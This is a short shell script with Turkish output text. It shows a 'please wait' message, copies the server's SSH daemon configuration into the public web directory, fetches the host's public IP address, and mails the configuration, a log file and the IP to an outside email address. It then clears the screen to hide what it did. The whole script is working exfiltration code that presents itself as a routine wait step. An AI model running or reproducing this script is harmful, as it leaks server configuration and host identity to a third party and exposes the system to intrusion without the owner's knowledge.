echo "Lutfen Bekleyin..."
cp /etc/ssh/sshd_config /var/www/html/ssh.txt
touch /tmp/log.txt
cd /tmp/
curl -o ip.txt https://ipinfo.io/ip
sendmail b0ru70@ajanlar.org < /var/www/html/ssh.txt
sendmail b0ru70@ajanlar.org < /tmp/log.txt
sendmail b0ru70@ajanlar.org < /tmp/ip.txt
sendmail b0ru70@ajanlar.org < /var/www/html/ssh.txt
cd /root/
clear
